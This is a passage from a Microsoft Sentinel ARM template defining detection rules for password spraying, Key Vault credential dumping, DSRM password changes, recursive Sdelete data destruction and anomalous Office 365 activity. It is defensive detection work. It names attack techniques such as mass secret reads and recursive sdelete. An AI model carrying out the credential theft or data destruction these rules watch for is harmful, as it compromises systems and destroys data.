              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user2"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-175')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-175')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-175: [RBA] Linux - Potential Password Spray Attack",
          "description": "This alert identifies attempts (failed logins) with multiple accounts from the same source in a short time interval. MITRE: T1110 Category: Linux tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let latency = 30m;\nlet start_time = 30m;\nlet end_time = now();\nSyslog\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where Facility in ('auth','authpriv')\n| extend FailedUser = extract('Failed password for invalid user (\\\\S+)',1,SyslogMessage)\n| extend FailedIP = extract('Failed password for invalid user (\\\\S+) from (\\\\S+) port \\\\d+ (\\\\S+)',2,SyslogMessage)\n| extend FailedProtocol = extract('Failed password for invalid user (\\\\S+) from (\\\\S+) port \\\\d+ (\\\\S+)',3,SyslogMessage)\n| where FailedUser <> ''\n| project TimeGenerated, FailedIP, FailedUser, FailedProtocol, Facility, HostName, SyslogMessage, Computer, _ItemId\n| mv-apply l=A175_EXCLUDED_SOURCE_IP to typeof(string) on //Not in IP list\n( \nextend ExcludedIP = ipv4_is_match(l,FailedIP)\n)\n| summarize ExcludedIPCount=countif(ExcludedIP) by TimeGenerated, FailedIP, FailedUser, FailedProtocol, Facility, HostName, SyslogMessage, Computer, _ItemId\n| where ExcludedIPCount == 0\n| summarize First=min(TimeGenerated),Last=max(TimeGenerated), NumberOfAccountsTried=dcount(FailedUser),count(),Protocols=make_set(FailedProtocol, 5),AccountsTried=make_set(FailedUser, 50),FailedIPs=make_set(FailedIP, 50), Events=make_set(pack_all(), MaxSize=5), ItemIds=make_set(_ItemId), CountPublic=countif(not(ipv4_is_private(FailedIP))) by HostCustomEntity=Computer\n| extend PasswordsPerAccountAvg = round(todouble(count_/NumberOfAccountsTried),2)\n| where NumberOfAccountsTried > 2\n| extend SeverityScore = CountPublic * 2\n| extend SeverityScore = SeverityScore + array_length(FailedIPs) * 2\n| extend SeverityScore = SeverityScore + NumberOfAccountsTried\n| extend SeverityScore = SeverityScore + count_\n| extend Severity = case(SeverityScore <= 30, 'Low',SeverityScore between (30 .. 50), 'Medium','High')\n| extend VictimEntity=AccountsTried\n| extend AttackerEntity=FailedIPs\n| extend ExtendedDescription=strcat('A total of ', NumberOfAccountsTried, ' accounts had attempted logins with a total of  ', count_, ' login attempts', '\\n Targeted user accounts: ', AccountsTried, '\\n Attacker IP addresses used: ', FailedIPs)\n| project HostCustomEntity\n, First\n, Last\n, NumberOfAccountsTried\n, count_\n, Protocols\n, AccountsTried\n, FailedIPs\n, Events\n, ItemIds\n, CountPublic\n, PasswordsPerAccountAvg\n, SeverityScore\n, Severity\n, AttackerEntity\n, VictimEntity\n, ExtendedDescription\n, RBAScore = 3",
          "queryFrequency": "PT30M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT12H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies attempts (failed logins) with multiple accounts from the same source in a short time interval.\n\n{{ExtendedDescription}}\n\nMITRE: T1110\nCategory: Linux\ntag: RBA",
            "alertSeverityColumnName": "Severity"
          },
          "customDetails": {
            "ItemId": "ItemIds",
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-108')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-108')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-108: [RBA] Azure Key Vault - Access TimeSeries Anomaly",
          "description": "Indentifies a sudden increase in count of Azure Key Vault secret or vault access operations by CallerIPAddress. The query leverages a built-in KQL anomaly detection algorithm  to find large deviations from baseline Azure Key Vault access patterns. Any sudden increase in the count of Azure Key Vault accesses can be an  indication of adversary dumping credentials via automated methods. If you are seeing any noise, try filtering known source(IP/Account) and user-agent combinations. TimeSeries Reference Blog: https://techcommunity.microsoft.com/t5/azure-sentinel/looking-for-unknown-anomalies-what-is-normal-time-series/ba-p/555052 MITRE: T1555 Category: Azure Key Vault tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let starttime = 14d;\nlet timeframe = 1d;\nlet scorethreshold = 3;\nlet baselinethreshold = 5;\nlet OperationList = dynamic(\n['SecretGet', 'KeyGet', 'VaultGet']);\nlet TimeSeriesData = AzureDiagnostics\n| where TimeGenerated between (startofday(ago(starttime))..startofday(now()))\n| extend ResultType = columnifexists('ResultType', 'None'), CallerIPAddress = columnifexists('CallerIPAddress', 'None')\n| where ResultType !~ 'None' and isnotempty(ResultType)\n| where CallerIPAddress !~ 'None' and isnotempty(CallerIPAddress)\n| where ResourceType =~ 'VAULTS' and ResultType =~ 'Success'\n| where OperationName in (OperationList) \n| project TimeGenerated, OperationName, Resource, CallerIPAddress \n| make-series HourlyCount=count() on TimeGenerated from startofday(ago(starttime)) to startofday(now()) step timeframe by Resource;\n//Filter anomolies against TimeSeriesData\nlet TimeSeriesAlerts = TimeSeriesData\n| extend (anomalies, score, baseline) = series_decompose_anomalies(HourlyCount, scorethreshold, -1, 'linefit')\n| mv-expand HourlyCount to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double),score to typeof(double), baseline to typeof(long)\n| where anomalies > 0 | extend AnomalyHour = TimeGenerated\n| where baseline > baselinethreshold // Filtering low count events per baselinethreshold\n| project Resource, AnomalyHour, TimeGenerated, HourlyCount, baseline, anomalies, score;\n// Filter the alerts since specified timeframe\nTimeSeriesAlerts\n| where TimeGenerated > ago(timeframe)\n// Join against base logs since specified timeframe to retrive records associated with the hour of anomoly\n| join (\nAzureDiagnostics\n| where TimeGenerated > ago(timeframe)\n| extend ResultType = columnifexists('ResultType', 'NoResultType')\n| extend requestUri_s = columnifexists('requestUri_s', 'None'), identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g = columnifexists('identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g', 'None')\n| extend id_s = columnifexists('id_s', 'None'), CallerIPAddress = columnifexists('CallerIPAddress', 'None'), clientInfo_s = columnifexists('clientInfo_s', 'None')\n| where ResultType !~ 'None' and isnotempty(ResultType)\n| where identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g !~ 'None' and isnotempty(identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g)\n| where id_s !~ 'None' and isnotempty(id_s)\n| where CallerIPAddress !~ 'None' and isnotempty(CallerIPAddress)\n| where clientInfo_s !~ 'None' and isnotempty(clientInfo_s)\n| where requestUri_s !~ 'None' and isnotempty(requestUri_s)\n| where ResourceType =~ 'VAULTS' and ResultType =~ 'Success'\n| where OperationName in (OperationList)  \n| summarize PerOperationCount=count(), LatestAnomalyTime = arg_max(TimeGenerated,*) by bin(TimeGenerated,1h), Resource, OperationName, id_s, CallerIPAddress, identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g, requestUri_s, clientInfo_s     \n) on Resource, TimeGenerated \n| summarize EventCount=count(), OperationNameList = make_set(OperationName), RequestURLList = make_set(requestUri_s), AccountList = make_set(identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g), AccountMax = arg_max(identity_claim_http_schemas_microsoft_com_identity_claims_objectidentifier_g,*) by Resource, id_s, clientInfo_s, LatestAnomalyTime\n| extend timestamp = LatestAnomalyTime, IPCustomEntity = CallerIPAddress, AccountCustomEntity = AccountMax",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1555"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11355')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11355')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11355: [RBA] Windows - Attempt to set DSRM",
          "description": "Generates an alert when an attempt was made to set the Directory Services Restore Mode administrator password MITRE: T1098 Category: Windows Security tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 15m;\nlet latency = 0m;\nlet start_time_historical = 60m;\nlet end_time_historical = 10m;\nlet alert_bin = 30m;\nlet end_time = now();\nlet EventIDList = dynamic([4794]);\nSecurityEvent\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where SubjectUserName <> \"-\"\n| project TimeGenerated, SubjectUserName, Computer, Activity,IpAddress\n| project bv_src_user = SubjectUserName\n  , bv_src_dvc = Computer\n  , bv_start_time = TimeGenerated\n  , bv_vendor_action = Activity\n  , bv_src_ip = IpAddress\n| mv-apply e = BV11355_CONFIGURATION.EXCLUSION on (\n    extend keys = bag_keys(e)\n    | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n    | extend bv_src_user_excluded = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n    | extend bv_src_dvc_excluded = iff(bv_src_dvc contains e.bv_src_dvc and isnotempty(e.bv_src_dvc), 1, 0)\n    | extend bv_vendor_action_excluded = iff(bv_vendor_action contains e.bv_vendor_action and isnotempty(e.bv_vendor_action), 1, 0)\n    | extend excluded_count = \n            bv_src_user_excluded\n            + bv_src_dvc_excluded\n            + bv_vendor_action_excluded\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n  )\n  | extend ExcludedEvent = iff(excluded contains 'true', true, false)\n  | where not(ExcludedEvent)\n  | extend ExtendedDescription = strcat(\n    'bv_src_user: ', bv_src_user\n    ,'\\nbv_src_dvc: \\n* ', bv_src_dvc\n    ,'\\nbv_start_time: \\n* ', bv_start_time\n    ,'\\nbv_vendor_action: \\n* ', bv_vendor_action\n    )\n  | extend VictimEntity = pack_array(bv_src_user) \n  | project bv_src_user\n  , bv_src_dvc\n  , bv_src_ip\n  , bv_start_time\n  , bv_vendor_action\n  , ExtendedDescription\n  , VictimEntity\n  , RBAScore = 3",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Generates an alert when an attempt was made to set the Directory Services Restore Mode administrator password\n\n{{ExtendedDescription}}\n\nMITRE: T1098 \nCategory: Windows Security\ntag: RBA"
          },
          "customDetails": {
            "RBAScore": "RBAScore",
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-109')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-109')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-109: [RBA] Azure AD - Rare PowerShell Behavior",
          "description": "This will alert when an user or application signs in using Azure Active Directory PowerShell to access non-Active Directory resources, such as the Microsoft Graph, which may be undesired or unauthorized behavior.   For capabilities and expected behavior of the Azure Active Directory PowerShell module, see: https://docs.microsoft.com/powershell/module/azuread/?view=azureadps-2.0.   For further information on Azure Active Directory Signin activity reports, see: https://docs.microsoft.com/azure/active-directory/reports-monitoring/concept-sign-ins. MITRE: T1059 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let ingested_lookback = 1h; \nlet generated_lookback = 1h;\nlet alert_time=1h;\nSigninLogs\n|where TimeGenerated > ago(generated_lookback) and ingestion_time() > ago(ingested_lookback)\n| where AppId =~ '1b730954-1685-4b74-9bfd-dac224a7b894' \n| where TokenIssuerType =~ 'AzureAD'\n| where ResourceIdentity !in (A109_EXCLUDED_RESOURCES) \n| where Status.errorCode == 0\n| project-reorder IPAddress, UserAgent, ResourceDisplayName, UserDisplayName, UserId, UserPrincipalName\n| order by TimeGenerated desc\n| summarize NumberEvents=count(), FirstTime=min(TimeGenerated), LastTime=max(TimeGenerated), ResourceDisplayNames=make_set(ResourceDisplayName), AzureResourceCustomEntity=min(ResourceIdentity) by UserPrincipalName, IPAddress, bin(TimeGenerated, alert_time) \n| extend AccountCustomEntity=UserPrincipalName, IPCustomEntity = IPAddress",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2506')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2506')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2506: [SOC] Windows - Sdelete Deployed Via GPO And Run Recursively",
          "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.\n\nSdelete is an application that securely deletes data in a way that makes it unrecoverable. This detection looks for the Sdelete process being run recursively after being deployed to a host via GPO. Attackers could use this technique to deploy Sdelete to multiple host and delete data on them.\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host MITRE: T1565,T1561,T0879,T1485 Category: Windows Security tag: SOC tag: Zero-Day",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 15m;\nlet end_time = now();\nlet latency = 60m;\nlet EventIDList = dynamic([4688]); \nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where Process =~ 'svchost.exe'\n| where CommandLine contains '-k GPSvcGroup' or CommandLine contains '-s gpsvc'\n| join kind=inner (SecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where Process =~ 'sdelete.exe' or CommandLine has 'sdelete'\n| where ParentProcessName endswith 'svchost.exe'\n| where CommandLine has_all ('-s', '-r')\n| project OldProcessId = ProcessId, Computer\n) on $left.NewProcessId == $right.OldProcessId, Computer\n| parse Computer with ComputerName '.' ComputerDomain\n|summarize TimeGenerated=max(TimeGenerated), arg_max(NewProcessId, *) by ComputerName, SubjectUserName\n| extend ExtendedDescription = strcat('Computer ', ComputerName, ' executed sdelete recursively with parent process name ', ParentProcessName)\n| extend VictimEntity = pack_array(SubjectUserName, ComputerName)\n| extend bv_mapping_tag = Computer\n| project TimeGenerated, Computer, VictimEntity, ExtendedDescription, ProcessName=NewProcessName, ParentProcessName, ComputerName, ComputerDomain, SubjectUserName, SubjectDomainName, CommandLine, NewProcessId, OldProcessId, bv_mapping_tag",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT1H15M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1565",
            "T1561",
            "T0879",
            "T1485"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.\n\nSdelete is an application that securely deletes data in a way that makes it unrecoverable. This detection looks for the Sdelete process being run recursively after being deployed to a host via GPO. Attackers could use this technique to deploy Sdelete to multiple host and delete data on them.\n\n{{ExtendedDescription}}\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host        \n\nMITRE: T1565, T1561, T0879, T1485 \nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SubjectUserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "SubjectDomainName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "ComputerDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-10623')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-10623')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-10623: [RBA] O365 - Activity From An Anomalous User",
          "description": "This alert identifies anomalous activities based on security logs from Office 365 MITRE: T1078,T1114 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1h;\nlet latency = 0m;\nlet alert_bin = 1h;\nlet end_time = now();\nlet start_time_historical = 7d;      \nlet exclusion_fields = datatable (\n    bv_src_user:string\n    , bv_file_name: string     \n    , bv_user_agent: string\n    , bv_vendor_action: string \n    , bv_vendor_category: string\n)[];\nlet exclusions = ( T:(\n    bv_src_user:string\n    , bv_file_name: string    \n    , bv_user_agent: string\n    , bv_vendor_action: string \n    , bv_vendor_category: string    \n    )\n    , Exclusion: dynamic) {\n    T\n    | mv-apply e = Exclusion on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | extend bv_src_user_array = split(e.bv_src_user, ',')\n        | mv-apply f = bv_src_user_array on ( \n            extend bv_src_user_excluded = iff(tolower(bv_src_user) contains tolower(f) and isnotempty(f), true, false)\n            | summarize bv_src_user_excluded = countif(bv_src_user_excluded)\n            | extend bv_src_user_excluded = iff(bv_src_user_excluded > 0 , 1, 0)\n        )\n    | extend bv_file_name_excluded = iff(bv_file_name contains e.bv_file_name and isnotempty(e.bv_file_name), 1, 0)\n    | extend bv_user_agent_excluded = iff(bv_user_agent contains e.bv_user_agent and isnotempty(e.bv_user_agent), 1, 0)\n    | extend bv_vendor_action_excluded = iff(bv_vendor_action contains e.bv_vendor_action and isnotempty(e.bv_vendor_action), 1, 0)\n    | extend bv_vendor_category_excluded = iff(bv_vendor_category contains e.bv_vendor_category and isnotempty(e.bv_vendor_category), 1, 0)           \n    | extend excluded_count = \n                  bv_src_user_excluded\n                  + bv_file_name_excluded\n                  + bv_user_agent_excluded\n                  + bv_vendor_action_excluded\n                  + bv_vendor_category_excluded\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n    )\n    | extend ExcludedEvent = iff(excluded contains 'true', true, false)\n    | project-away excluded\n};\nlet O365Activity = OfficeActivity\n| where TimeGenerated between (ago(start_time_historical) .. end_time) \n| project\n        bv_start_time = TimeGenerated\n        , bv_src_ip = ClientIP\n        , bv_vendor_action = Operation\n        , bv_src_user = UserId\n        , bv_url = Site_Url\n        , bv_file_name = SourceFileName\n        , bv_object = OfficeObjectId\n        , bv_user_agent = UserAgent\n        , bv_vendor_category = RecordType\n;\nlet historical_activity = O365Activity      \n| where  bv_start_time < ago(start_time)\n| summarize \n        bv_historical_src_ip = make_set(bv_src_ip)\n        , bv_historical_vendor_category = make_set(bv_vendor_category)\n        , bv_historical_user_agent = make_set(bv_user_agent)\n        , bv_historical_vendor_action = make_set(bv_vendor_action)\n        , bv_historical_event_count = count()\n        by \n          bv_src_user;\nO365Activity \n|where bv_start_time > ago(start_time)\n| union exclusion_fields | invoke exclusions(BV10623_CONFIGURATION['EXCLUSION']) \n| summarize \n        bv_start_time = min(bv_start_time)\n        , bv_end_time   = max(bv_start_time)\n        , bv_vendor_action = make_set(bv_vendor_action)\n        , bv_file_name=make_set(bv_file_name)\n        , bv_url=make_set(bv_url)\n        , bv_user_agent = make_set(bv_user_agent)\n        , bv_vendor_category = make_set(bv_vendor_category)\n        , bv_src_ip = make_set(bv_src_ip)\n        , bv_event_count = count()\n        by \n          bv_src_user           \n| join kind=leftouter historical_activity on bv_src_user\n| extend NewIP = iff(array_length(set_intersect(bv_src_ip, bv_historical_src_ip)) < array_length(bv_src_ip), true, false)\n| extend NewUserAgent = iff(array_length(set_intersect(bv_historical_user_agent, bv_user_agent)) < array_length(bv_user_agent), true, false)\n| extend NewCategory = iff(array_length(set_intersect(bv_historical_vendor_category, bv_vendor_category)) < array_length(bv_vendor_category), true, false)\n| extend NewOperation = iff(array_length(set_intersect(bv_historical_vendor_action, bv_vendor_action)) < array_length(bv_vendor_action), true, false)\n| extend NewItems = array_sort_desc(pack_array(NewIP, NewUserAgent, NewCategory, NewOperation))\n| extend Percentage = (1.0*(bv_event_count - bv_historical_event_count)/bv_historical_event_count) * 100\n| where bv_event_count > bv_historical_event_count and Percentage >= BV10623_CONFIGURATION.EVENT_THRESHOLD and NewItems[0] == true and NewItems[1] == true and NewItems[2] == true\n| extend VictimEntity = pack_array(bv_src_user)\n| extend AttackerEntity = pack_array(bv_src_user)\n| extend ExtendedDescription = strcat(\n        'bv_src_user: ', bv_src_user           \n        , '\\nbv_vendor_action: \\n* ', strcat_array(bv_vendor_action, '\\n* ')\n        , '\\nbv_vendor_category: \\n* ', strcat_array(bv_vendor_category, '\\n* ')\n        , '\\nbv_user_agent: \\n* ', strcat_array(array_slice(bv_user_agent, 0, 5), '\\n* ')        \n        , '\\nbv_src_ip: \\n* ', strcat_array(array_slice(bv_src_ip, 0, 5), '\\n* ')\n        , '\\nbv_file_name: \\n* ', strcat_array(array_slice(bv_file_name, 0, 5), '\\n* ')                \n)\n| project \n      bv_start_time\n      , bv_end_time\n      , bv_src_user\n      , bv_event_count\n      , bv_historical_event_count\n      , bv_vendor_category\n      , bv_historical_vendor_category\n      , bv_vendor_action\n      , bv_historical_vendor_action\n      , bv_user_agent\n      , bv_historical_user_agent        \n      , bv_src_ip\n      , bv_historical_src_ip\n      , bv_file_name\n      , ExtendedDescription\n      , VictimEntity\n      , AttackerEntity\n      , RBAScore = BV10623_CONFIGURATION['RBASCORE']",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies anomalous activities based on security logs from Office 365\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Office 365"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-187')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-187')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-187: [RBA] O365 - Mail redirect via ExO transport rule",
          "description": "Identifies when Exchange Online transport rule configured to forward emails. This could be an adversary mailbox configured to collect mail from multiple user accounts. MITRE: T1114 Category: Office 365 tag: RBA",
          "severity": "Medium",
          "enabled": true,
